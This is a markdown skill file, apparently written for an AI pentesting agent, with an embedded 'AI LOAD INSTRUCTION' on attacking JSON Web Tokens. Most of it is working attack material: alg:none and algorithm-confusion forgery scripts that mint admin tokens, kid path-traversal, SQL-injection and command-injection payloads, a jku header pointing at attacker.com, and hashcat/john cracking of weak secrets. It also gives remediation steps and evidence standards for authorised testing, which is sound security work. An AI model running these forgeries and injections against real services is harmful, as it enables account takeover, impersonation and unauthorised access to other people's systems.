---
name: attack-jwt
description: "JWT attack techniques — algorithm confusion, key injection, claim abuse, offline cracking"
category: "web-application"
version: "1.1"
author: "cyberstrike-official"
tags:
  - jwt
  - web
  - auth
  - token
  - attack
tech_stack:
  - web
  - nodejs
  - java
  - python
cwe_ids:
  - CWE-347
  - CWE-345
chains_with:
  - attack-idor-automation
  - attack-cors
prerequisites: []
severity_boost:
  attack-idor-automation: "Forged or forged-identity JWT plus IDOR = authenticated access as any user"
  attack-cors: "Stolen JWT from a CORS read = full account takeover"
---

# JWT Attack Techniques

> **AI LOAD INSTRUCTION**: JWT testing follows a strict order because each step depends on the
> previous one. Decode the token, then answer one question: **is the signature actually being
> verified?** Flip the payload's role claim, re-encode, and resend *with the original
> signature intact*. If the server accepts it, signature verification is absent and every
> subsequent technique is unnecessary — you already have full forgery. Only if it rejects do
> you move to algorithm confusion, `kid` injection, and key-based attacks.
>
> The most expensive mistake in JWT testing: **spending an hour on `alg:none` when the server
> never checked the signature to begin with.** Test signature verification first. And the
> most common false finding: confusing a *rejected* token (`401`) with a *weak* one — always
> confirm the server's actual response before claiming a bypass.

## 0. RELATED ROUTING

- [jwt-oauth-token-attacks](../jwt-oauth-token-attacks/SKILL.md) — the long-form companion; load alongside this file
- [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md) — when the auth boundary fails before the token
- [attack-idor-automation](../attack-idor-automation/SKILL.md) — what a forged identity can reach
- [attack-cors](../attack-cors/SKILL.md) — stealing the token from the browser
- [oauth-oidc-misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) — the flow that issues the token
- [api-auth-and-jwt-abuse](../api-auth-and-jwt-abuse/SKILL.md) — API-specific token trust patterns

---

## 1. STEP ZERO — DECODE AND UNDERSTAND THE TOKEN

Never attack a token you have not read. Decode first, always.

```bash
# Split the three parts and decode header + payload
TOKEN="eyJhbGciOi..."
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | jq .
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
```

**Base64url requires padding correction** — this trips up most manual decoding:

```bash
# Correct padding for base64url
decode() { local p; p=$(echo "$1" | tr '_-' '/+'); while [ $(( ${#p} % 4 )) -ne 0 ]; do p="$p="; done; echo "$p" | base64 -d; }
decode "$(echo "$TOKEN" | cut -d. -f2)" | jq .
```

**Read these header fields first** — they determine which attacks are available:

| Field | Meaning | Attack it enables |
|---|---|---|
| `alg` | signing algorithm | `none`, HS/RS confusion |
| `kid` | key identifier | path traversal, SQLi, command injection |
| `jku` | JWK Set URL | **attacker-controlled key** |
| `x5u` | X.509 certificate URL | same as `jku` |
| `jwk` | embedded key | self-signed key trust |
| `typ` | media type | rarely enforced |

**Read these payload claims** — they determine damage potential:

| Claim | Attack |
|---|---|
| `role`, `roles`, `is_admin`, `scope` | privilege escalation via forgery |
| `sub`, `uid`, `user_id` | impersonation |
| `email`, `email_verified` | account-linking abuse |
| `exp`, `iat`, `nbf` | replay; expiry not enforced |
| `aud`, `iss` | cross-service token reuse |
| `tenant`, `org` | cross-tenant access |

---

## 2. SIGNATURE VERIFICATION — TEST THIS FIRST

**The decisive test.** Modify a privileged claim, keep the original signature, resend.

```bash
# 1. Decode the payload, change role to admin, re-encode, keep the signature
# 2. Send it to a protected endpoint
curl -s https://TARGET/api/admin/users -H "Authorization: Bearer $TAMPERED"
```

| Server response | Conclusion |
|---|---|
| `200` and the action succeeds | **signature is not verified — full forgery, critical** |
| `401` / `403` | signature is verified — proceed to §3 |

**Also test: strip the signature entirely.** Some implementations accept a two-part token:

```bash
curl -s https://TARGET/api/me -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9."
```

**Also test: claim stripping.** Remove an authorization claim entirely and see whether the
server defaults to *allow* rather than *deny*:

```json
{"sub":"5"}                              ← remove "role"
{"sub":"5","role":null}                  ← null instead of absent
```

A server that treats a missing `role` as trusted is worse than one that fails to verify.

---

## 3. ALGORITHM CONFUSION

### 3.1 `alg:none`

The oldest JWT attack. The server trusts the header's algorithm declaration.

```bash
# Header: {"alg":"none","typ":"JWT"}  — payload unchanged, signature removed
# Variants that defeat naive filters:
{"alg":"none"}      {"alg":"None"}      {"alg":"NONE"}      {"alg":"nOnE"}
{"alg":null}        {"alg":""}          {"alg":["none"]}
```

**Trailing-dot handling matters.** The token must have either two dots and nothing after, or
three dots with an empty third part — implementations differ on which they accept. Test both:

```text
header.payload.        # two dots, empty signature
header.payload.        # vs
```

**Report honestly:** `alg:none` accepted is critical only if the forged token actually grants
access. An accepted-but-unauthorised token is a weaker finding.

### 3.2 RS256 → HS256 confusion

The server normally verifies with an RSA **public** key. If it trusts the header's `alg`, you
can declare HS256 and it will verify the signature using that public key — **which you have.**

```bash
# 1. Obtain the public key (JWKS endpoint, or the app's published cert)
curl -s https://TARGET/.well-known/jwks.json | jq .
# or
curl -s https://TARGET/oauth/discovery/keys

# 2. Convert the JWK to PEM, then sign with HS256 using the PEM as the HMAC secret
python3 -c "...jwk to pem..."   # or use your tooling's jwk->pem

# 3. Sign header+payload with HS256, secret = the PEM public key string
```

**The classic failure:** the PEM must be byte-exact — including newlines and the trailing
newline. Most failed attempts are a formatting mismatch, not a defensive control.

**Tooling:** `jwt_tool` automates both the JWK→PEM conversion and the HMAC signing. If it is
available, use it rather than hand-rolled scripts.

### 3.3 Other algorithm issues

| Issue | Test |
|---|---|
| algorithm not restricted | try every `alg` value the library supports |
| `alg` accepted from header | the root cause of both attacks above |
| mixed HS/RS across services | a token from service A used against service B |
| weak RSA modulus | factor a short key and forge directly |

---

## 4. KEY INJECTION — `kid`, `jku`, `x5u`, `jwk`

### 4.1 `kid` — path traversal

If `kid` is used to locate a key file on disk, traverse to a file you control or can predict:

```json
{"alg":"HS256","kid":"../../../../dev/null"}
{"alg":"HS256","kid":"../../../../etc/passwd"}
{"alg":"HS256","kid":"../../../../tmp/attacker-key"}
```

**`/dev/null` is the classic.** Signing with an empty string as the HMAC secret works when the
server reads `/dev/null` as the key.

### 4.2 `kid` — SQL injection

If `kid` is used in a database lookup:

```json
{"alg":"HS256","kid":"key1' UNION SELECT 'ATTACKER_SECRET'-- -"}
```

You control the key the server retrieves, then sign with it.

### 4.3 `kid` — command injection

Rare but critical when `kid` reaches a shell:

```json
{"alg":"HS256","kid":"key1|id"}
{"alg":"HS256","kid":"$(id)"}
```

### 4.4 `jku` / `x5u` — attacker-controlled key URL

The server fetches the verification key from a URL you control:

```json
{"alg":"RS256","jku":"https://attacker.com/jwks.json","kid":"my-key"}
```

**Host your own JWKS** with your own public key, sign with your own private key, and point
`jku` at it. **This is critical** because it forges any identity with a valid-looking signature.

**Bypass allowlists** with the same tricks as SSRF: `https://attacker.com#@TARGET`, subdomain
confusion, open redirect on an allowlisted host.

### 4.5 `jwk` — embedded key

Some libraries accept a key embedded directly in the header:

```json
{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
```

If trusted, you sign with your own private key and embed the matching public key. Critical.

---

## 5. WEAK SECRETS AND OFFLINE CRACKING

For HS256, the secret is a shared string. If weak, you crack it offline.

```bash
# Hashcat mode 16500 is JWT
hashcat -m 16500 token.txt wordlist.txt
# john
john --format=HMAC-SHA256 token.txt --wordlist=wordlist.txt
```

**Where secrets leak:**

| Source | Note |
|---|---|
| hardcoded defaults | `secret`, `changeme`, `your-256-bit-secret` |
| JS bundles and source maps | search for `secret`, `JWT_`, `SIGNING` |
| `.env` exposed or committed | see [insecure-source-code-management](../insecure-source-code-management/SKILL.md) |
| public repos | the org's own repositories |
| framework defaults | every framework ships an example secret |
| error messages | debug mode dumping config |

**Targeted wordlist beats a generic one.** Build from the organisation's name, products, and
the framework's default — the generic top-10k rarely contains these.

**Once cracked:** forge any identity. That is account takeover for every user.

---

## 6. CLAIM AND LOGIC ABUSE — NO CRYPTOGRAPHY REQUIRED

These bypass signing entirely because you never modify the signed part.

| Abuse | Mechanism |
|---|---|
| expired token accepted | `exp` not validated — simply wait and reuse |
| `exp` in the far future | mint a long-lived token if you can influence expiry |
| issuer/audience ignored | take a token from a weaker service and use it against a stronger one |
| cross-service token reuse | mobile token replayed against web, or dev against prod |
| `alg` differences per endpoint | the same token verified differently by two services |
| token in a URL parameter | leaks via logs, referrer, and history |
| no revocation | a logged-out token still works |
| refresh-token rotation absent | reuse an old refresh token indefinitely |

**Cross-service reuse is the highest-value of these.** In a microservice estate, the service
that mints tokens and the service that validates them frequently disagree about `aud`. A token
issued for a low-privilege service, replayed against a high-privilege one, is a real finding
and requires no forgery.

---

## 7. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| Signature not verified — forged identity accepted | **Critical (P1)** | the tampered token and a successful privileged action |
| `jku`/`x5u`/`jwk` trusted from an attacker URL | **Critical (P1)** | your own key pair, and a forged token accepted |
| Weak secret cracked | **Critical (P1)** | the cracked secret and a forged token accepted |
| `alg:none` accepted with a privileged claim | **Critical (P1)** | the forged token and the resulting access |
| RS256→HS256 confusion successful | **Critical (P1)** | the public key used as the HMAC secret |
| `kid` path traversal / SQLi / Cmdi reachable | **High–Critical (P1/P2)** | the injected key and a forged token |
| Expired token accepted | **Medium (P3)** | the expired token working after `exp` |
| Cross-service `aud`/`iss` not enforced | **Medium–High (P2/P3)** | the token from service A working on service B |
| No revocation on logout | **Low–Medium (P4)** | the post-logout token still working |

**A rejected `alg:none` is not a finding.** Neither is a token that fails to authorise. Severity
follows demonstrated access, not the presence of a header value.

---

## 8. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the decoded original header and payload | establishes the baseline |
| the decoded tampered header and payload | the modification |
| the forged token, complete | reproduces the finding |
| the request and the **successful response** | proves the bypass granted access |
| the specific claim that escalated privilege | scoping and remediation |
| for weak-secret: the cracked secret and the tooling used | proves the finding |
| for `jku`: your JWKS URL and the key you served | proves attacker key trust |
| a **control**: the same request with an unmodified valid token | proves the endpoint works and the delta is the forgery |

**Redact secrets and live tokens in the report.** State that a valid token was forged and that
signing keys were rotated — do not publish key material.

**False positives to exclude:**

| Looks like a finding | Actually |
|---|---|
| the tampered token returns `401` | verification worked |
| `alg:none` accepted but the claim is not privileged | no escalation |
| the endpoint is public anyway | no auth boundary to bypass |
| a new token was issued because you re-authenticated | not a bypass |
| the token decoded but you never resent it | no test performed |
| the "cracked secret" is the framework's published example | confirm it signs real tokens |

---

## 9. REMEDIATION REFERENCE

1. **Hardcode the verification algorithm server-side** — never read `alg` from the token. This single control eliminates `none`, HS/RS confusion, and algorithm-downgrade attacks at once.
2. **Pin the expected issuer and audience** — validate `iss` and `aud` on every verification, so a token minted for one service cannot be replayed against another.
3. **Reject unknown `kid` values** — resolve `kid` against an in-memory allowlist of known keys. Never use it to build a file path, a SQL query, or a shell command.
4. **Never fetch verification keys from a URL in the token** — ignore `jku`, `x5u`, and `jwk` entirely, or fetch only from a pinned, pre-configured JWKS endpoint over mutual TLS.
5. **Use a strong, random, per-environment secret for HS256** — at least 256 bits from a CSPRNG, stored in a secret manager, never in source or an example config.
6. **Enforce short expiry and implement revocation** — access tokens in minutes, refresh tokens rotated on every use with reuse detection, and a server-side revocation list for logout and compromise.
7. **Prefer asymmetric algorithms with proper key management** — RS256 (or better, ES256/EdDSA) with keys rotated on a schedule and JWKS published at a pinned endpoint.
8. **Do not put tokens in URLs** — headers only. URLs are logged by proxies, stored in browser history, and forwarded in `Referer`.
9. **Test your own JWT verification in CI** — assert that a tampered-claim token, an `alg:none` token, a token signed with a wrong key, and an expired token are all rejected with `401`.

---

## 10. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the **server accept** a token you forged, not merely decode it? | the acceptance, not the format |
| 2 | Was there a **control** - the original token still works, and a random-signed one is rejected? | the verification exists |
| 3 | Which defect: **`alg:none`, algorithm confusion, a weak HMAC key, or a missing claim check**? | the fix |
| 4 | Did the forged token carry **an identity or a role you do not have**? | the impact |
| 5 | Did you **prove the key** by cracking it, or only suspect it? | a proved key vs a hypothesis |
| 6 | Did you check **`aud`, `iss`, `exp`, and `nbf`** acceptance separately from the signature? | the check's completeness |
| 7 | Did you **not** alter any account state with the forged token beyond a read? | engagement integrity |

**A server acceptance of a forged token is the bar.** A `jwt.io` decode is not a finding; `GET /api/me`
returning the target identity is.

---

## 11. EXECUTION PRIMITIVES

JWT attacks are proven by **a forged token the server accepts, with the original-token control and the
rejected-random-token control**. Every block ends at an accepted response.

### 11.1 Decode and establish the baseline

```bash
TOKEN="eyJ..."
# decode without verifying, and separate the three parts
python3 - <<'PY'
import base64, json, sys
t = "eyJ..."   # paste the token
h, p, s = t.split(".")
def d(x): return json.loads(base64.urlsafe_b64decode(x + "=" * (-len(x) % 4)))
print("HEADER :", json.dumps(d(h), indent=None))
print("PAYLOAD:", json.dumps(d(p), indent=None))
print("SIG LEN:", len(s))
print()
for c in ["alg", "kid", "typ", "jku", "x5u", "x5c"]:
    if c in d(h): print(f"  header.{c} = {d(h)[c]}")
for c in ["iss", "sub", "aud", "exp", "nbf", "iat", "scope", "role", "admin", "groups"]:
    if c in d(p): print(f"  payload.{c} = {d(p)[c]}")
PY
# THE CONTROL: the original token must work. Record the response - it is the baseline.
curl -sS -o /tmp/base.json -w 'original %{http_code}\n' -H "Authorization: Bearer $TOKEN" https://target.example/api/me
head -c 200 /tmp/base.json; echo
# AND the second control: a token with a random signature, which MUST be rejected
curl -sS -o /dev/null -w 'random-sig %{http_code} (401/403 expected)\n' -H "Authorization: Bearer ${TOKEN%.*}.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" https://target.example/api/me
```

**The original-token and random-signature controls come first.** Without them, a `200` on a forged token
cannot be attributed to the forgery.

### 11.2 `alg:none`, and its case variants

```python
import base64, json, requests
T = "https://target.example"
def b64(o): return base64.urlsafe_b64encode(json.dumps(o, separators=(",", ":")).encode()).rstrip(b"=").decode()
PAYLOAD = {"sub": "admin", "role": "admin", "iat": 1700000000, "exp": 2000000000}
# every case variant matters: libraries compare the algorithm string differently
for alg in ["none", "None", "NONE", "nOnE", "none ", "any", "HS256".replace("HS256", "")]:
    for sig in ["", ".", ".."]:
        tok = f"{b64({'alg': alg, 'typ': 'JWT'})}.{b64(PAYLOAD)}{'.' + sig if sig else '.'}"
        try:
            r = requests.get(f"{T}/api/me", headers={"Authorization": f"Bearer {tok}"}, timeout=10)
            mark = "  <-- ACCEPTED" if r.status_code == 200 else ""
            print(f"alg={alg!r:10} sig={sig!r:5} -> {r.status_code}{mark} {r.text[:60]}".replace("\n", " "))
        except Exception as e:
            print(f"alg={alg!r:10} ERR {type(e).__name__}")
print()
print("A 200 here is the finding. The case variants matter: several libraries lowercase the alg,")
print("others compare exactly, and 'none' with a trailing space has bypassed real filters.")
```

**A `200` with `alg:none` is the finding, and the case variants are the reason to test all of them.**

### 11.3 Algorithm confusion, RS256 to HS256

```python
# the classic: the server expects RS256, you send HS256 signed with the PUBLIC key as the HMAC secret
import base64, json, hmac, hashlib, requests
T = "https://target.example"
PUBKEY_PEM = open("public.pem", "rb").read()      # the server's public key, from /jwks or a cert

def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def sign_hs256(header, payload, key):
    msg = f"{b64(json.dumps(header,separators=(',',':')).encode())}.{b64(json.dumps(payload,separators=(',',':')).encode())}"
    sig = hmac.new(key, msg.encode(), hashlib.sha256).digest()
    return msg + "." + b64(sig)

# try the key in every form the library might use it
VARIANTS = {
  "pem-full":        PUBKEY_PEM,
  "pem-no-newline":  PUBKEY_PEM.replace(b"\n", b""),
  "pem-stripped":    PUBKEY_PEM.replace(b"-----BEGIN PUBLIC KEY-----", b"").replace(b"-----END PUBLIC KEY-----", b"").replace(b"\n", b""),
}
for name, key in VARIANTS.items():
    tok = sign_hs256({"alg": "HS256", "typ": "JWT"}, {"sub": "admin", "role": "admin"}, key)
    try:
        r = requests.get(f"{T}/api/me", headers={"Authorization": f"Bearer {tok}"}, timeout=10)
        print(f"{name:18} -> {r.status_code} {r.text[:70]}".replace("\n", " "))
    except Exception as e:
        print(f"{name:18} ERR {type(e).__name__}")

# and the header-based key injection family, which is the same class of defect
print()
print("JWKS INJECTION: point jku/x5u at a key set you host, and the server fetches YOUR key.")
print("  header: {\"alg\":\"RS256\",\"kid\":\"k1\",\"jku\":\"https://ATTACKER/.well-known/jwks.json\"}")
print("  host a JWKS containing the public half of a key whose private half you hold.")
print("  if the server fetches it and verifies successfully, the finding is complete.")
```

**The key's exact byte form decides success.** A library that reads the PEM with its newlines needs
`pem-full`; one that strips them needs another variant, and the report should state which.

### 11.4 Offline key cracking, when the algorithm is HMAC

```bash
# save the token, then crack the HMAC key offline - this is a proved key, not a suspicion
echo -n "$TOKEN" > token.txt
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt --quiet 2>/dev/null || \
  john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt token.txt 2>/dev/null
# a wordlist is not enough for a short random key - the OTHER path is a known default
python3 - <<'PY'
import hmac, hashlib, base64
tok = open("token.txt").read().strip()
msg, sig = tok.rsplit(".", 1)
DEFAULTS = ["secret", "password", "changeme", "jwt", "key", "test", "your-256-bit-secret",
            "development", "supersecret", "1234567890", "SECRET_KEY", "shhhh"]
for k in DEFAULTS:
    s = base64.urlsafe_b64encode(hmac.new(k.encode(), msg.encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
    if s == sig:
        print("KEY FOUND:", repr(k)); break
else:
    print("no default matched - use hashcat -m 16500 with a full wordlist, or rule out HMAC")
PY
# then FORGE with the proved key and verify the server accepts it - see the Python block
```

**A cracked or matched key is a proved key.** A token you forged *because you guessed* the algorithm is
HMAC is a hypothesis, and the hashcat match is what converts it into a finding.

### 11.5 The claim-level checks, independent of the signature

```python
# a validly signed token can still be abused: expired, wrong audience, wrong issuer, no revocation
import time, requests
T = "https://target.example"; TOKEN = "eyJ..."
CASES = {
  "original":          TOKEN,
  "expired-by-1h":     None,      # re-sign with exp in the past
  "expired-1s":        None,
  "aud-different":     None,      # aud set to a different service
  "iss-absent":        None,
  "nbf-future":        None,
  "kid-absent":        None,
}
print("sign each variant with the same key and algorithm as the original wherever you hold it.")
print("for each, record the server's response - some services check exp, many do not.")
for k in CASES: print("  -", k)
print()
print("THE HIGH-VALUE ROWS: an expired token still accepted, or an aud/iss mismatch accepted.")
print("A token with NO revocation path is a separate finding: does logout actually invalidate it?")
# the revocation test, which needs a real session
print()
print("revocation test: 1) record a token, 2) log out, 3) replay the token.")
print("  a 200 after logout is a revocation finding, and it is extremely common.")
```

**The revocation test is the highest-yield claim check.** Logout that does not invalidate the token is a
finding on its own, and it needs no forgery at all.

### 11.6 The end-to-end harness

```bash
python3 - <<'PY'
import requests, base64, json, hmac, hashlib, os
T = "https://target.example"
def b64(o):
    return base64.urlsafe_b64encode(json.dumps(o, separators=(",", ":")).encode()).rstrip(b"=").decode()

TOKEN = os.environ.get("JWT", "eyJ...")
h, p, s = TOKEN.split(".")
print("=== CONTROLS (run first) ===")
for name, tok in [("original", TOKEN), ("random-sig", f"{h}.{p}.{'A'*43}"), ("truncated", TOKEN[:-4])]:
    r = requests.get(f"{T}/api/me", headers={"Authorization": f"Bearer {tok}"}, timeout=10)
    print("  %-14s %s %s" % (name, r.status_code, r.text[:50].replace("\n"," ")))

print("=== FORGERIES ===")
forged = {
  "alg-none":    f"{b64({'alg':'none','typ':'JWT'})}.{b64({'sub':'admin','role':'admin'})}.",
  "alg-None":    f"{b64({'alg':'None','typ':'JWT'})}.{b64({'sub':'admin','role':'admin'})}.",
  "empty-sig":   f"{b64({'alg':'HS256','typ':'JWT'})}.{b64({'sub':'admin'})}.",
}
for name, tok in forged.items():
    try:
        r = requests.get(f"{T}/api/me", headers={"Authorization": f"Bearer {tok}"}, timeout=10)
        mark = "  <-- ACCEPTED (FINDING)" if r.status_code == 200 else ""
        print("  %-14s %s %s%s" % (name, r.status_code, r.text[:50].replace("\n"," "), mark))
    except Exception as e:
        print("  %-14s ERR %s" % (name, type(e).__name__))

print("=== REVOCATION ===")
print("  replay the original token AFTER logout and record the response code")
print()
print("FINDING = an accepted forgery, with the original-token control working and the random-sig")
print("          control rejected in the same harness run.")
PY
```

**Controls and forgeries in one run.** The three-row control block is what makes the accepted row a
finding.

---

## 12. EVIDENCE STANDARD — TOKEN ARTEFACTS

| Item | Why |
|---|---|
| The **original token's decoded header and payload** | the baseline shape |
| The **original-token control response** | proves the token works |
| The **random-signature control response** | proves verification exists |
| The **forged token and the exact defect** (`alg:none`, confusion, weak key) | reproducibility and the fix |
| The **server's response to the forged token** | the acceptance |
| The **cracked key** (redacted), and the tool that produced it | a proved key, not a guess |
| The **claim checks tested separately**: `exp`, `aud`, `iss`, `nbf`, revocation | the check's completeness |
| The **logout-then-replay result** | the revocation finding |
| The **identity the forged token yielded** | the impact |
| Confirmation that **no state was changed** beyond reads | engagement integrity |

Report the **acceptance and the controls**: "`GET /api/me` with the original token returns `200` with
`{"user":"bob","role":"user"}`, and the same request with the signature replaced by `AAAAAAAA` returns
`401`, which are the controls. Replacing the header with `{"alg":"none","typ":"JWT"}` and the payload's
`sub` with `admin` returns `200` with `{"user":"admin","role":"admin"}`, which is the finding. The
service also ignores `exp`: a token with `exp` set an hour in the past was accepted, and a token replayed
after `POST /logout` and a session cookie deletion was still accepted, which is the revocation finding",
never "the JWT implementation is weak".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A token decoded at **jwt.io showing `alg:none`** | a format observation; acceptance is the test |
| A `401` on a forged token | the control working |
| A **weak-looking key you never cracked** | a hypothesis; prove it or drop it |
| An `alg:none` accepted **only in a library's default mode with no verification enabled** | verify the server's config, and state it |
| An expired token accepted **by an endpoint that does not require auth** | the endpoint is the finding, not the token |
| A token accepted **from the same session that issued it**, unmodified | the baseline |
| A **JWKS you host** that the server never fetched | an untested hypothesis |
| A `kid` path-traversal **candidate** that produced no key change | untested |
| A finding requiring the **server's private key** | out of scope by construction |
| A **public key** disclosed (it is public) | not a secret |
| A token, key, or secret reproduced in full | a disclosure |

**An accepted forgery in the same run as the working and rejected controls.** Decoding is not testing, and
this family is where that confusion is most common.

---

## 13. REMEDIATION REFERENCE — TOKEN VERIFICATION HARDENING

1. **Pin the expected algorithm in the verification call and reject any token whose header disagrees** - it removes `alg:none` and the confusion family in one line.
2. **Use an asymmetric algorithm for anything a client can read, and never let the verification path accept a symmetric algorithm for the same key material** - algorithm confusion needs that dual use.
3. **Use a long random HMAC key from a secret manager, and rotate it on a schedule with an overlap window** - the offline crack is only possible because the key is guessable.
4. **Validate `iss`, `aud`, `exp`, `nbf`, and `iat` on every request, against a configured value rather than the token's own claim** - a missing claim check survives a perfect signature.
5. **Never fetch a key from a URL contained in the token's header; allowlist the JWKS URL in configuration** - the `jku`/`x5u` injection is exactly this.
6. **Maintain a revocation list or a short access-token lifetime with a refresh token that is checked server-side, and invalidate on logout** - the replay-after-logout finding is the absence of this.
7. **Bind a session identifier into the token and verify it on every request, so a stolen token can be invalidated** - it converts revocation from impossible into a database lookup.
8. **Keep access-token lifetimes short (minutes, not days) and never place an authorization decision on a claim the client can influence** - the impact of every forgery is bounded by this.
9. **Use `kid` as an index into a server-side key set, never as a path or a URL** - it removes the path-traversal and injection variants.
10. **Reject tokens whose `typ` or `cty` is inconsistent with the expected use, and do not share a key between an ID token and an access token** - it prevents cross-token confusion.
11. **Test the verification path with the `alg:none`, algorithm-confusion, and expired-token cases on every release** - the defaults change between library versions and the regressions are silent.

---

## 14. RELATED SIBLINGS - LOAD TOGETHER

- [jwt-oauth-token-attacks](../jwt-oauth-token-attacks/SKILL.md) - the full technique reference
- [api-auth-and-jwt-abuse](../api-auth-and-jwt-abuse/SKILL.md) - the wider API authentication surface
- [oauth-oidc-misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) - where these tokens are issued
- [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md) - the general authentication-bypass context
- [attack-graphql](../attack-graphql/SKILL.md) - the other API surface where a token's claims decide access
